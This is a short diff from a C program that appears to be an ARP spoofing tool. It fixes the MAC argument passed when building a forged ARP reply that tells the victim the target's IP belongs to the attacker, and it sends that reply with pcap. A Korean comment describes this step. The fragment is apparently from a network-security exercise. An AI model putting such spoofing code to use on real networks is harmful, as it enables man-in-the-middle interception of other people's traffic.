@@ -120,7 +120,7 @@ int main(int argc, char* argv[])
 
     // 두 번째로 할 일 - sender 에게 [ip = target ip / mac = attacker mac] 인 arp response 전송
     arp_packet arp_packet_deceive_sender;
-    arp_packet_deceive_sender = arp_reply_target_ip_with_attacker_mac(attacker_mac_host, sender_mac, target_ip, sender_ip);
+    arp_packet_deceive_sender = arp_reply_target_ip_with_attacker_mac(attacker_mac, sender_mac, target_ip, sender_ip);
 
     if(pcap_sendpacket(handle, (uint8_t *)(& arp_packet_deceive_sender), ARP_PACKET_LEN) != 0){
         printf("[Error] packet sending is failed.\n");
